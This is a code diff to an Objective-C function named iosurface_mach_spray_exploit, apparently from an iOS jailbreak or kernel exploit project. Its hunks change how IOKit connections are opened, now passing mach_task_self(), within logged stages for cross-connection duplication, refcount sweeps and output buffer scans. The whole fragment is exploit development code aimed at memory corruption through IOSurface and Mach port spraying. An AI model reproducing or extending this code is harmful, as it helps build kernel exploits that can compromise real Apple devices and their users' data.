@@ -37967,9 +37967,10 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
         log(@"JB47: ===== J1: Cross-Connection Dup (1 trial) =====");
         @try {
             unsigned int conn1 = 0, conn2 = 0, gConn = 0;
-            int r1 = sym_open(svc, 0, 0, &conn1);
-            int r2 = sym_open(svc, 0, 0, &conn2);
-            int r3 = sym_open(svc, 0, 0, &gConn);
+            unsigned int self_task = mach_task_self();
+            int r1 = sym_open(svc, self_task, 0, &conn1);
+            int r2 = sym_open(svc, self_task, 0, &conn2);
+            int r3 = sym_open(svc, self_task, 0, &gConn);
             log([NSString stringWithFormat:@"JB47: [J1] open r1=%d r2=%d r3=%d", r1, r2, r3]);
             if (r1 == 0 && r2 == 0 && r3 == 0) {
                 unsigned int wp = jb41_newWakePort();
@@ -38010,8 +38011,9 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
         log(@"JB47: ===== J2: Refcount Sweep (rc=1,2,4) =====");
         @try {
             unsigned int oConn = 0, gConn = 0;
-            int r1 = sym_open(svc, 0, 0, &oConn);
-            int r2 = sym_open(svc, 0, 0, &gConn);
+            unsigned int self_task = mach_task_self();
+            int r1 = sym_open(svc, self_task, 0, &oConn);
+            int r2 = sym_open(svc, self_task, 0, &gConn);
             log([NSString stringWithFormat:@"JB47: [J2] open r1=%d r2=%d", r1, r2]);
             if (r1 == 0 && r2 == 0) {
                 uint64_t rcs[] = {1, 2, 4};
@@ -38057,8 +38059,9 @@ void iosurface_mach_spray_exploit(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnul
         log(@"JB47: ===== J3: Output Buffer Scan (sz=24 only) =====");
         @try {
             unsigned int oConn = 0, gConn = 0;
-            int r1 = sym_open(svc, 0, 0, &oConn);
-            int r2 = sym_open(svc, 0, 0, &gConn);
+            unsigned int self_task = mach_task_self();
+            int r1 = sym_open(svc, self_task, 0, &oConn);
+            int r2 = sym_open(svc, self_task, 0, &gConn);
             log([NSString stringWithFormat:@"JB47: [J3] open r1=%d r2=%d", r1, r2]);
             if (r1 == 0 && r2 == 0) {
                 unsigned int wp = jb41_newWakePort();
